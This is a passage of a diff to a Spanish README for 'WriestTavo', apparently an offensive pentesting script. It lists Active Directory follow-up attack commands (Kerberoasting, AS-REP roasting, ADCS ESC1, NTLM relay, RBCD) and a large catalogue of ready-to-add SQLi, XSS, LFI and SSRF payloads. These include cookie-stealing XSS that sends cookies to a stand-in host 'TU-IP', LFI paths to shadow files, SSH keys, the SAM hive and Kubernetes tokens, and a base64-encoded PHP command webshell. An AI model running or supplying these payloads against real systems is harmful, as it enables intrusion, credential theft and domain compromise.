+| 20 | Protected Users group vacío | 🟠 MEDIO | Pass-the-Hash/Ticket |
+| 21 | Domain Trusts bidireccionales | 🟠 ALTO | Cross-domain attack |
+| 22 | GPOs — enumeración | ℹ INFO | GPO abuse (requiere BloodHound) |
+| 23 | Sin Fine-Grained PSO | 🟡 BAJO | Password spray facilitado |
+| 24 | Nivel funcional obsoleto | 🟠 MEDIO | Funciones de seguridad deshabilitadas |
+| 25 | **MachineAccountQuota > 0** | 🟠 ALTO | RBCD attack sin credenciales de servicio |
+| 26 | Grupos nested en Domain Admins | 🟠 ALTO | Escalada indirecta |
+| 27 | Domain Admins con email | 🟠 MEDIO | Phishing de cuentas privilegiadas |
+| 28 | AD Recycle Bin deshabilitado | 🟡 BAJO | No recovery de objetos |
+| 29 | Sin GPO de auditoría avanzada | 🟠 MEDIO | Ataques sin detección |
+| 30 | **PASSWD_NOTREQD activo** | 🔴 CRÍTICO | Cuentas con contraseña vacía |
+| 31 | BloodHound — recolección | ℹ INFO | Análisis visual de attack paths |
+| 32 | Impacket disponible | ℹ INFO | Verificación de tooling |
+| 33 | Dump completo usuarios | ℹ INFO | → `all_users.txt` |
+| 34 | Dump completo grupos | ℹ INFO | → `all_groups.txt` |
+| 35 | Dump completo equipos | ℹ INFO | → `all_computers.txt` |
+
+### Archivos Generados por ADPulse
+
+```
+wriestTavo_results/active_directory/
+├── all_users.txt          # Todos los usuarios del dominio
+├── all_groups.txt         # Todos los grupos y membresías
+├── all_computers.txt      # Todos los equipos del dominio
+├── kerberoastable.txt     # SPNs para kerberoasting
+├── inactive_accounts.txt  # Cuentas sin logon >90 días
+├── gpos.txt               # GPOs del dominio
+├── adpulse_log.txt        # Log del módulo
+└── bloodhound/            # Datos BloodHound (si disponible)
+    └── *.zip
+```
+
+### Herramientas de Follow-Up
+
+```bash
+# Kerberoasting
+impacket-GetUserSPNs 'corp.local/ldapuser:Password123' \
+  -dc-ip 192.168.1.10 -request -outputfile kerberoast.hashes
+hashcat -m 13100 kerberoast.hashes rockyou.txt --force
+
+# AS-REP Roasting
+impacket-GetNPUsers corp.local/ -usersfile users.txt \
+  -format hashcat -outputfile asrep.hashes -dc-ip 192.168.1.10
+hashcat -m 18200 asrep.hashes rockyou.txt
+
+# ADCS ESC1
+certipy req -u USER@corp.local -p PASS -ca CA-NAME \
+  -template TEMPLATE -upn administrator@corp.local -dc-ip 192.168.1.10
+
+# SMB Signing deshabilitado → NTLM Relay
+responder -I eth0 -rdw
+impacket-ntlmrelayx -smb2support -t ldaps://192.168.1.10 --add-computer
+
+# RBCD (MachineAccountQuota > 0)
+impacket-addcomputer corp.local/USER:PASS -computer-name 'ATTACKER$' \
+  -computer-pass 'Password123!' -dc-ip 192.168.1.10
+impacket-rbcd -f ATTACKER -t TARGET -dc-ip 192.168.1.10 \
+  corp.local/USER:PASS -action write
+```
 
 ---
 
 ## Sistema INTEL
 
-El cerebro de WriestTavo. Son 52 variables compartidas entre módulos que hacen que el scan sea progresivo e inteligente.
+El cerebro de WriestTavo. Variables compartidas entre todos los módulos para scan progresivo e inteligente.
 
-### Variables Principales
+### Variables Principales (84 en total)
 
 ```bash
-# Sistema operativo
+# OS y Red
 INTEL_OS=""                    # linux | windows | other
-
-# WAF
 INTEL_WAF_DETECTED=false
 INTEL_WAF_NAME=""
-INTEL_SCAN_DELAY=0             # Se aumenta automáticamente si hay WAF
+INTEL_SCAN_DELAY=0             # Auto-aumenta si hay WAF
 
-# Frameworks detectados
+# Frameworks
 INTEL_CMS=""                   # wordpress | joomla | drupal | magento
-INTEL_FRAMEWORK_JS=""          # react | nextjs | vue | nuxt | angular | svelte | astro | remix
-INTEL_FRAMEWORK_BACKEND=""     # laravel | symfony | django | flask | fastapi | nestjs | express | aspnet | dotnetcore | rails
+INTEL_FRAMEWORK_JS=""          # react | nextjs | vue | nuxt | angular | svelte | astro
+INTEL_FRAMEWORK_BACKEND=""     # laravel | symfony | django | flask | fastapi | nestjs | express | aspnet | rails
+INTEL_TECHNOLOGIES=()          # php, nodejs, python, java, mysql, redis, docker...
 
-# Stack tecnológico
-INTEL_TECHNOLOGIES=()          # php, nodejs, python, java, mysql, redis, docker, etc.
+# URLs y Descubrimientos
+INTEL_INJECTABLE_URLS=()       # → SQLi, XSS, LFI, SSRF
+INTEL_API_ENDPOINTS=()         # → arjun, NoSQLi, XXE
+INTEL_SENSITIVE_PATHS=()
+INTEL_JWT_TOKENS=()            # → módulo 35 JWT
+INTEL_JS_SECRETS=()
+INTEL_GRAPHQL_URL=""
+INTEL_SWAGGER_URL=""
 
-# URLs y endpoints descubiertos
-INTEL_INJECTABLE_URLS=()       # URLs con parámetros → van a SQLi, XSS, LFI, SSRF
-INTEL_API_ENDPOINTS=()         # Endpoints API → van a arjun, NoSQLi, XXE
-INTEL_SENSITIVE_PATHS=()       # Rutas sensibles encontradas
-INTEL_FRAMEWORK_ROUTES=()      # Rutas del framework probadas en módulo 30
-
-# Tokens y secretos
-INTEL_JWT_TOKENS=()            # JWTs encontrados → van al módulo 35
-INTEL_JS_SECRETS=()            # Secrets en archivos JS
-INTEL_API_KEYS=()              # API keys encontradas
-
-# APIs especiales
-INTEL_GRAPHQL_URL=""           # URL de GraphQL si se descubrió
-INTEL_SWAGGER_URL=""           # URL de Swagger/OpenAPI
-
-# Vulnerabilidades confirmadas
+# Vulnerabilidades Confirmadas
 INTEL_SQLI_FOUND=false         # → activa sqlmap automáticamente
 INTEL_XSS_FOUND=false
 INTEL_LFI_FOUND=false
-INTEL_LFI_PARAM=""             # Parámetro vulnerable
-INTEL_LFI_URL=""               # URL vulnerable
+INTEL_LFI_PARAM=""
+INTEL_LFI_URL=""
 INTEL_SSRF_FOUND=false
-INTEL_SSRF_URL=""              # → prueba cloud metadata automáticamente
+INTEL_SSRF_URL=""              # → prueba cloud metadata auto
 INTEL_SSTI_FOUND=false
 INTEL_CORS_VULN=false
-INTEL_CORS_ORIGIN=""           # → usado para generar PoC CSRF
+INTEL_JWT_ALG_NONE=false
+INTEL_JWT_WEAK_SECRET=""
 
 # Infraestructura
 INTEL_DOCKER_EXPOSED=false
 INTEL_K8S_EXPOSED=false
 INTEL_CLOUD_PROVIDER=""        # aws | gcp | azure | cloudflare
 
-# Payloads custom (cargados por el usuario)
-INTEL_EXTRA_PAYLOADS_SQLI=()   # Payloads extra para módulo 13
-INTEL_EXTRA_PAYLOADS_XSS=()    # Payloads extra para módulo 14
-INTEL_EXTRA_PAYLOADS_LFI=()    # Payloads extra para módulo 31
+# Payloads Confirmados (nuevo en v4.1)
+EFFECTIVE_PAYLOADS=()          # "tipo|||payload|||url|||evidencia"
 
-# Exploit intelligence
-INTEL_NVD_CVES=()              # CVEs de NVD del stack
-INTEL_GHSA_VULNS=()            # GitHub Security Advisories
-INTEL_EDB_RESULTS=()           # Exploits encontrados en EDB
+# ADPulse (nuevo en v4.1)
+AD_KERBEROASTABLE=()
+AD_ASREPROASTABLE=()
+AD_ADCS_TEMPLATES=()
+AD_UNCONSTRAINED=()
+AD_DA_MEMBERS=()
 ```
 
-### Cómo Fluye la Inteligencia
+---
+
+## Sistema de Reportes — 4 Tipos
+
+### Cómo se generan
+
+Al finalizar cualquier scan completo, WriestTavo genera automáticamente los 4 reportes:
 
 ```
-Ejemplo real con WordPress + PHP + MySQL:
-
-whatweb detecta:
-  INTEL_CMS = "wordpress"
-  INTEL_TECHNOLOGIES = ["php", "mysql"]
-  INTEL_FRAMEWORK_BACKEND = "laravel"  ← si es Laravel
-        ↓
-gobuster usa:
-  wordlist = /usr/share/seclists/.../wordpress.fuzz.txt
-        ↓
-nuclei agrega:
-  templates = -t wordpress/ (además de los defaults)
-        ↓
-sqli usa:
-  payloads MySQL (no genéricos)
-  URLs de gobuster que terminaron en .php?id=
-        ↓
-sqlmap activa:
-  --dbms=mysql --tamper=space2comment (si hay WAF)
-        ↓
-edb_intel busca:
-  "wordpress", "wordpress plugin rce", "wordpress plugin sqli"
-  en searchsploit + EDB online + NVD CVEs de "wordpress"
+wriestTavo_results/
+├── reporte_TARGET_FECHA.html          ← Original (siempre existió)
+├── reporte_CLIENTE_TARGET_FECHA.html  ← NUEVO v4.1
+├── reporte_CENSURADO_FECHA.html       ← NUEVO v4.1
+└── reporte_PENTESTER_TARGET_FECHA.html ← NUEVO v4.1
 ```
+
+No requiere configuración ni flags adicionales. Todos se crean al mismo tiempo que el reporte original.
+
+### Reporte 1 — Cliente IT (`reporte_CLIENTE_*.html`)
+
+**Audiencia**: Gerente de TI, CISO, equipo IT del cliente.
+
+**Diseño**: Fondo blanco, tipografía corporativa, colores de severidad estándar.
+
+**Contenido**:
+- Banner de nivel de riesgo global con color (🔴 CRÍTICO / 🟠 ALTO / etc.)
+- CVSS promedio del scan
+- **Plan de acción en 3 columnas temporales**:
+  - 🔴 Acción Inmediata (0-48h) — solo críticos
+  - 🟠 Próximo Sprint (1-2 semanas) — altos
+  - 🟢 Backlog (30-90 días) — medios y bajos
+- Contexto del entorno en chips visuales (OS, CMS, WAF, Cloud, stack)
+- **Tabla de inyecciones confirmadas** con badge `✓ INYECCIÓN CONFIRMADA` sobre cada hallazgo donde el payload fue efectivo
+- Hallazgos en lenguaje de negocio (sin comandos técnicos)
+- Impacto por hallazgo en texto no técnico
+
+**Lo que NO incluye**: IPs internas, comandos de explotación, rutas del sistema, hashes.
+
+### Reporte 2 — Censurado (`reporte_CENSURADO_*.html`)
+
+**Audiencia**: Dirección General, departamento Legal, Compliance, terceros sin clearance técnico.
+
+**Redactado automáticamente**:
+
+| Dato | Reemplazado por |
+|------|----------------|
+| IPs (`192.168.1.10`) | `[IP CENSURADA]` |
+| URLs (`https://app.corp.com/admin`) | `[URL CENSURADA]` |
+| Rutas (`/etc/passwd`, `C:\Windows\...`) | `[RUTA CENSURADA]` |
+| Hashes (`a87ff679a2f3e71d9181a67...`) | `[HASH CENSURADO]` |
+| Tokens JWT (`eyJ...`) | `[TOKEN JWT CENSURADO]` |
+| Comandos (`<code>...</code>`) | `[COMANDO TÉCNICO OMITIDO]` |
+| Salidas técnicas (`<pre>...</pre>`) | `[SALIDA TÉCNICA OMITIDA]` |
+| Target en header | `[SISTEMA CENSURADO]` |
+
+**Incluye**:
+- Banner `CONFIDENCIAL — DISTRIBUCIÓN RESTRINGIDA`
+- Nota de privacidad explicando qué fue omitido
+- Tabla resumida: tipo de vulnerabilidad + severidad + CVSS + descripción genérica + remediación
+- Disclaimer legal al pie
+
+### Reporte 3 — Pentester (`reporte_PENTESTER_*.html`)
+
+**Audiencia**: Analista de seguridad, Red Team, consultor de pentesting.
+
+**Diseño**: Tema oscuro (#0d1117), fuente monoespaciada, estilo IDE/terminal.
+
+**Contenido completo**:
+
+**1. INTEL completo** — todas las variables con valor, incluyendo las más críticas en rojo:
+- LFI URL y parámetro exacto
+- SSRF URL confirmada
+- CORS origin aceptado
+- JWT secret crackeado
+- SPNs Kerberoastables
+- Templates ADCS vulnerables
+
+**2. Attack Chains encadenadas** (autogeneradas según INTEL):
+
+| Si se encontró... | Se genera cadena de... |
+|-------------------|----------------------|
+| SQLi + MySQL | Confirmar → Dump BD → Crackear hashes → `--os-shell` RCE |
+| LFI + PHP | Confirmar → PHP wrapper → Log poisoning → Reverse shell |
+| SSRF + AWS/GCP/Azure | Acceder metadata → Obtener IAM credentials → AWS CLI |
+| SSTI + Jinja2/Twig | Confirmar motor → Payload RCE → Reverse shell |
+| Kerberoasting | GetUserSPNs → hashcat -m 13100 → Pass-the-Hash → DA |
+
+**3. Tabla de payloads efectivos** — payload exacto, URL, evidencia.
+
+**4. URLs inyectables** — lista completa para copiar y pegar.
+
+**5. Tips de exploración manual** por stack detectado:
+- GraphQL: comandos de introspection + fingerprinting
+- Docker API: containers → LPE con volumen `/`
+- JWT débil: jwt_tool + forge token con rol admin
+- CORS: PoC con fetch autenticado
+- AD: BloodHound + secretsdump + certipy
+
+**6. Comandos de seguimiento** listos para copiar.
 
 ---
 
 ## Sistema de Actualización
 
-WriestTavo tiene un sistema para mantenerse al día con vulnerabilidades nuevas que salen cada día.
-
-### Comandos de Actualización
-
 ```bash
-# Actualizar TODO (recomendado semanalmente)
+# Actualizar TODO:
+# nuclei templates + NVD CVE feed (48h) + EDB RSS + SecLists + payloads custom
 sudo ./wriestTavo.sh --update
 
-# Configurar actualización automática diaria a las 6am
+# Auto-actualización diaria a las 6am
 sudo ./wriestTavo.sh --cron
 
-# Ver qué hay en caché (CVEs, payloads, módulos custom)
+# Ver CVEs y payloads en caché
 sudo ./wriestTavo.sh --show-cves
-```
 
-### ¿Qué actualiza `--update`?
-
-```
-[1/5] nuclei templates
-      → nuclei -update-templates
-      → descarga los últimos templates (CVEs, misconfigs, exposures)
-      → normalmente 50-200 templates nuevos por semana
-
-[2/5] NVD CVE Feed (últimas 48h)
-      → https://services.nvd.nist.gov/rest/json/cves/2.0
-      → filtra CVEs con CVSS ≥ 9.0
-      → guarda en ~/.wriestTavo/cve_cache/nvd_recent.json
-
-[3/5] Exploit-DB RSS feed
-      → https://www.exploit-db.com/rss.xml
-      → los últimos exploits publicados
-      → guarda en ~/.wriestTavo/edb_cache/exploitdb_recent.txt
-
-[4/5] SecLists (si es repo git)
-      → git -C /usr/share/seclists pull
-      → wordlists nuevas, payloads actualizados
-
-[5/5] Carga payloads custom del usuario
-      → lee ~/.wriestTavo/custom_payloads/*.txt
-      → los inyecta en los módulos en memoria
-```
-
-### Alerta de Desactualización
-
-Si han pasado más de 7 días sin actualizar, el script te avisa:
-```
-⚠  7 días sin actualizar. Ejecuta: sudo ./wriestTavo.sh --update
+# Alerta automática si >7 días sin actualizar
 ```
 
 ---
 
 ## Agregar Payloads Propios
 
-Esta es una de las funciones más poderosas. Cuando lees un writeup nuevo, encuentras un bypass, o ves un exploit en Exploit-DB, puedes agregarlo al script en **una sola línea**.
-
-### Agregar desde la Línea de Comandos
-
 ```bash
-# SQLi — agregar bypass nuevo
-sudo ./wriestTavo.sh --add-payload "' OR SLEEP(2)--" --payload-type sqli
-sudo ./wriestTavo.sh --add-payload "';WAITFOR DELAY '0:0:2'--" --payload-type sqli
-sudo ./wriestTavo.sh --add-payload "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" --payload-type sqli
-
-# XSS — evasión de WAF/filtros
-sudo ./wriestTavo.sh --add-payload "<svg/onload=alert(1)>" --payload-type xss
-sudo ./wriestTavo.sh --add-payload "<img src=x onerror=alert(document.cookie)>" --payload-type xss
-sudo ./wriestTavo.sh --add-payload "jaVaScRiPt:alert(1)" --payload-type xss
-sudo ./wriestTavo.sh --add-payload "<!--<img src=--><img src=x onerror=alert(1)//>" --payload-type xss
-
-# LFI — rutas nuevas o específicas de frameworks
-sudo ./wriestTavo.sh --add-payload "../../../../etc/shadow" --payload-type lfi
-sudo ./wriestTavo.sh --add-payload "/proc/1/root/etc/passwd" --payload-type lfi
-sudo ./wriestTavo.sh --add-payload "....//....//....//etc/passwd" --payload-type lfi
-sudo ./wriestTavo.sh --add-payload "/app/config/database.yml" --payload-type lfi
-
-# SSRF — endpoints internos nuevos
-sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:8080/admin" --payload-type ssrf
-sudo ./wriestTavo.sh --add-payload "http://kubernetes.default.svc/api/v1/" --payload-type ssrf
-
-# Paths/rutas — directorios sensibles nuevos
-sudo ./wriestTavo.sh --add-payload "/.git/FETCH_HEAD" --payload-type paths
-sudo ./wriestTavo.sh --add-payload "/actuator/heapdump" --payload-type paths
-sudo ./wriestTavo.sh --add-payload "/.aws/credentials" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type TIPO
+# tipos: sqli | xss | lfi | ssrf | paths
 ```
 
-### Tipos de Payload Disponibles
+### Cómo se cargan
 
-| Tipo | Archivo | Usado por módulo |
-|------|---------|-----------------|
-| `sqli` | `~/.wriestTavo/custom_payloads/sqli_extra.txt` | Módulo 13 (SQLi básico) |
-| `xss` | `~/.wriestTavo/custom_payloads/xss_extra.txt` | Módulo 14 (XSS) |
-| `lfi` | `~/.wriestTavo/custom_payloads/lfi_extra.txt` | Módulo 31 (LFI) |
-| `ssrf` | `~/.wriestTavo/custom_payloads/ssrf_extra.txt` | Módulo 32 (SSRF) |
-| `paths` | `~/.wriestTavo/custom_payloads/paths_extra.txt` | Módulo 8 (gobuster extra) |
+```
+init_update_system() crea directorios
+        ↓
+_load_custom_payloads() lee archivos .txt de ~/.wriestTavo/custom_payloads/
+        ↓
+Carga en INTEL_EXTRA_PAYLOADS_SQLI[], INTEL_EXTRA_PAYLOADS_XSS[], etc.
+        ↓
+Módulos usan: ALL_PAYLOADS = BASE_PAYLOADS + CUSTOM_PAYLOADS
+```
 
-### Editar los Archivos Directamente
+### Edición directa
 
 ```bash
-# Ver qué payloads tienes actualmente
-sudo ./wriestTavo.sh --show-cves
-
-# Editar directamente (formato: un payload por línea, # para comentarios)
 nano ~/.wriestTavo/custom_payloads/sqli_extra.txt
 nano ~/.wriestTavo/custom_payloads/xss_extra.txt
 nano ~/.wriestTavo/custom_payloads/lfi_extra.txt
-
-# Ejemplo de archivo sqli_extra.txt:
-# ── Bypass MySQL 8.x WAF (writeup 2024-03) ──
-' /*!50000OR*/ '1'='1
-' OR SLEEP(2) AND '1'='1
-# ── MSSQL time-based ──
-'; WAITFOR DELAY '0:0:3'--
+nano ~/.wriestTavo/custom_payloads/ssrf_extra.txt
+nano ~/.wriestTavo/custom_payloads/paths_extra.txt
 ```
 
-### Cómo se Cargan los Payloads
+---
 
-```
-Al ejecutar ./wriestTavo.sh:
-  init_update_system() crea los directorios si no existen
-  _load_custom_payloads() lee los .txt y los carga en:
-    INTEL_EXTRA_PAYLOADS_SQLI[]
-    INTEL_EXTRA_PAYLOADS_XSS[]
-    INTEL_EXTRA_PAYLOADS_LFI[]
+## Catálogo de Payloads Modernos
 
-Al ejecutar módulo 13 (SQLi):
-  ALL_PAYLOADS = PAYLOADS_BASE[] + INTEL_EXTRA_PAYLOADS_SQLI[]
-  → todos los payloads (internos + tuyos) se prueban juntos
+Lista de ~215 payloads **no incluidos** en el código base, seleccionados de HackerOne Hacktivity, PortSwigger Web Academy, PayloadsAllTheThings y OWASP Testing Guide 2024.
+
+### Payloads base incluidos en el script
+
+| Tipo | Cantidad base | Descripción |
+|------|--------------|-------------|
+| SQLi | 14 | `'`, `'--`, `' OR '1'='1`, `SLEEP`, `UNION SELECT NULL`... |
+| XSS | 14 | `<script>alert`, `<img onerror`, `<svg onload`... |
+| LFI | 20 | `../../../etc/passwd`, `php://filter`, `data://`, logs, Windows paths... |
+| SSRF | 6 | `http://127.0.0.1/`, `localhost`, `0.0.0.0`, `[::1]`... |
+| Paths | 0 | (gobuster usa wordlists de SecLists) |
+
+### SQL Injection (~45 nuevos)
+
+```bash
+# ─── Bypass de Autenticación ───────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "' OR 1=1 LIMIT 1 OFFSET 0--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "admin'/*" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' OR 'unusual'='unusual'--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "') OR ('1'='1" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' OR 1=1#" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "1' OR '1'='1'/*" --payload-type sqli
+
+# ─── Time-Based Blind ──────────────────────────────────────────
+# MySQL
+sudo ./wriestTavo.sh --add-payload "1' AND (SELECT SLEEP(3))--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "1' AND BENCHMARK(5000000,MD5(1))--" --payload-type sqli
+# MSSQL
+sudo ./wriestTavo.sh --add-payload "'; WAITFOR DELAY '0:0:3'--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "'; IF (1=1) WAITFOR DELAY '0:0:3'--" --payload-type sqli
+# PostgreSQL
+sudo ./wriestTavo.sh --add-payload "'; SELECT pg_sleep(3)--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "1' AND 1=(SELECT 1 FROM pg_sleep(3))--" --payload-type sqli
+# Oracle
+sudo ./wriestTavo.sh --add-payload "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--" --payload-type sqli
+# SQLite
+sudo ./wriestTavo.sh --add-payload "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))--" --payload-type sqli
+
+# ─── UNION Based ───────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "' UNION SELECT 1,2,3--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' UNION SELECT NULL,NULL,NULL--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' UNION SELECT @@version,NULL,NULL--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' UNION SELECT user(),database(),version()--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' UNION SELECT table_name,NULL FROM information_schema.tables--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' UNION SELECT username,password FROM users--" --payload-type sqli
+
+# ─── Error-Based ───────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--" --payload-type sqli
+
+# ─── WAF Bypass (Bug Bounty 2024) ──────────────────────────────
+sudo ./wriestTavo.sh --add-payload "'/**/OR/**/1=1--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' /*!OR*/ 1=1--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "'/*!50000OR*/1=1--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' oR '1'='1" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "'%09OR%091=1--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "'+OR+1=1--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "'%0aOR%0a1=1--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "' OR 0x313d31--" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "%27%20OR%20%271%27%3D%271" --payload-type sqli
+sudo ./wriestTavo.sh --add-payload "%2527%2520OR%25201%253D1--" --payload-type sqli
+
+# ─── JSON/API SQLi ─────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload '{"id":"1 OR 1=1--"}' --payload-type sqli
+sudo ./wriestTavo.sh --add-payload '{"id":"1; SELECT SLEEP(3)--"}' --payload-type sqli
+sudo ./wriestTavo.sh --add-payload '{"search":"test'"'"' UNION SELECT NULL--"}' --payload-type sqli
+
+# ─── GraphQL SQLi ──────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload '{"query":"{user(id:\"1 OR 1=1--\"){name}}"}' --payload-type sqli
 ```
+
+### XSS (~35 nuevos)
+
+```bash
+# ─── Sin comillas (WAF Bypass) ─────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "<svg onload=alert(1)>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<svg/onload=alert(1)>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<svg onload=alert\`1\`>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<svg onload=(alert)(1)>" --payload-type xss
+
+# ─── HTML5 Tags menos filtradas ────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "<math href=javascript:alert(1)>click</math>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<keygen autofocus onfocus=alert(1)>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<marquee onstart=alert(1)>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<details open ontoggle=alert(1)>" --payload-type xss
+
+# ─── Eventos ───────────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "<input autofocus onfocus=alert(1)>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<select autofocus onfocus=alert(1)>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<button onclick=alert(1)>click" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<div onmouseover=alert(1)>hover</div>" --payload-type xss
+
+# ─── DOM-Based ─────────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "<img src=1 onerror=alert(document.cookie)>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "javascript:alert(document.cookie)" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "data:text/html,<script>alert(1)</script>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "#<script>alert(1)</script>" --payload-type xss
+
+# ─── Robo de Cookies ───────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "<script>new Image().src='http://TU-IP/?c='+document.cookie</script>" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<img src=x onerror=fetch('http://TU-IP/?c='+document.cookie)>" --payload-type xss
+
+# ─── Evasión de Codificación ───────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "\u003cscript\u003ealert(1)\u003c/script\u003e" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "%253Cscript%253Ealert(1)%253C%252Fscript%253E" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">" --payload-type xss
+
+# ─── Bypass de CSP / Angular Template Injection ────────────────
+sudo ./wriestTavo.sh --add-payload "{{constructor.constructor('alert(1)')()}}" --payload-type xss
+sudo ./wriestTavo.sh --add-payload "{{7*7}}" --payload-type xss
+```
+
+### LFI / Path Traversal (~40 nuevos)
+
+```bash
+# ─── Linux — Credenciales ──────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/etc/shadow" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/etc/sudoers" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/root/.bash_history" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/root/.ssh/id_rsa" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/home/www-data/.ssh/id_rsa" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/root/.ssh/authorized_keys" --payload-type lfi
+
+# ─── Docker / Kubernetes ───────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/run/secrets/kubernetes.io/serviceaccount/token" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/var/run/secrets/kubernetes.io/serviceaccount/token" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/proc/1/environ" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/proc/net/fib_trie" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/proc/1/root/etc/passwd" --payload-type lfi
+
+# ─── Frameworks — Archivos de Configuración ────────────────────
+# Laravel
+sudo ./wriestTavo.sh --add-payload "/../../../.env" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/storage/logs/laravel.log" --payload-type lfi
+# WordPress
+sudo ./wriestTavo.sh --add-payload "/wp-config.php" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/wp-config.php.bak" --payload-type lfi
+# Django
+sudo ./wriestTavo.sh --add-payload "/settings.py" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/local_settings.py" --payload-type lfi
+# Rails
+sudo ./wriestTavo.sh --add-payload "/config/database.yml" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/config/secrets.yml" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/config/master.key" --payload-type lfi
+# Node.js
+sudo ./wriestTavo.sh --add-payload "/../config/default.json" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/../package.json" --payload-type lfi
+# Spring Boot
+sudo ./wriestTavo.sh --add-payload "/WEB-INF/web.xml" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/../application.properties" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/../application.yml" --payload-type lfi
+# ASP.NET
+sudo ./wriestTavo.sh --add-payload "/Web.config" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/appsettings.json" --payload-type lfi
+
+# ─── Windows ───────────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "C:/Windows/repair/SAM" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "C:/Windows/System32/config/SAM" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "C:/inetpub/wwwroot/web.config" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "..%5C..%5C..%5CWindows%5Cwin.ini" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "..%255c..%255c..%255cWindows%255cwin.ini" --payload-type lfi
+
+# ─── PHP Wrappers Avanzados ────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "php://filter/convert.base64-encode/resource=config.php" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "php://filter/convert.base64-encode/resource=../config.php" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "php://filter/read=string.rot13/resource=config.php" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "php://filter/zlib.deflate/convert.base64-encode/resource=index.php" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==" --payload-type lfi
+# Log Poisoning
